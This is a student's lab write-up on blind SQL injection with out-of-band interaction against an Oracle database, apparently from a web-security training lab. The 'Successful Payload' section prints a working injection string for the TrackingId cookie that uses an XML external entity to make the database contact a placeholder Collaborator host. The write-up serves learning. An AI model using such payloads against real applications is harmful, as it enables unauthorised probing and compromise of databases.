## Lab 9 — Blind SQL Injection with Out-of-Band Interaction

### Goal

Exploit a blind SQL injection vulnerability to cause the database to make a
DNS lookup to a Burp Collaborator domain.

### What I Observed

The application:

- Used the `TrackingId` cookie inside an SQL query.
- Executed the SQL query asynchronously.
- Did not return the query results.
- Did not provide useful response differences or errors.
- Allowed the database to interact with an external domain.

Because the SQL query was executed asynchronously, response time could not be
used as a reliable signal.

Instead, I used an **out-of-band interaction** to confirm that my injected
SQL was executed.

### Technique

I used **Burp Collaborator** to generate a unique external domain and monitor
for interactions with it.

The idea was:

```text
SQL Injection
      ↓
Database executes injected SQL
      ↓
Database performs DNS lookup
      ↓
Burp Collaborator receives the interaction
      ↓
I know the injected SQL was executed
````

### Successful Payload

```text
TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f>\<!DOCTYPE+root+[+\<!ENTITY+%25+remote+SYSTEM+"http%3a//BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--
```

The payload uses several Oracle-specific features, including:

* `UNION SELECT`
* `EXTRACTVALUE()`
* `XMLTYPE()`
* An XML external entity
* `DUAL`

I used Burp Collaborator to monitor the external domain and confirmed that
the database made an interaction with it.

### Why It Worked

The important idea is not the entire payload syntax.

The payload caused the Oracle database to process an external entity that
referenced the Burp Collaborator domain.

This caused the database to perform an external DNS lookup.

The interaction with Burp Collaborator provided an **out-of-band signal**
that the injected SQL had been executed.

### Out-of-Band SQL Injection

Out-of-band SQL injection is useful when:

* The application does not return SQL query results.
* The application does not provide useful error messages.
* The application does not provide a reliable response difference.
* Time-based techniques are not practical.
* The database can make external network interactions.

Instead of observing the application's response, I observe an interaction
with an external system.

### What I Learned

* Out-of-band SQL injection can be used when normal response-based techniques
  are not useful.
* The database can sometimes be induced to interact with an external domain.
* Burp Collaborator can detect DNS and other out-of-band interactions.
* An external interaction can confirm that injected SQL was executed.
* OOB SQL injection uses an external system as the information channel.
* The exact technique and payload depend heavily on the database type.
* Oracle-specific SQL/XML functionality can be used to trigger external
  interactions.

### What I Don't Fully Understand Yet

The overall concept is clear to me:

```text
SQL Injection → Database → External DNS Request → Burp Collaborator
```

However, the exact Oracle/XML payload is still difficult for me to understand,
especially:

* `XMLTYPE()`
* `EXTRACTVALUE()`
* `DOCTYPE`
* XML external entities
* The `%remote` entity syntax

I understand **what the payload accomplishes**, but I still need to study
the individual Oracle/XML components before I can construct this type of
payload myself.

### Key Takeaway

Out-of-band SQL injection is different from the previous blind SQLi
techniques because the application response is not the information channel.

```text
Conditional response → Application response
Conditional error    → SQL error
Time-based           → Response time
Out-of-band          → External interaction
```
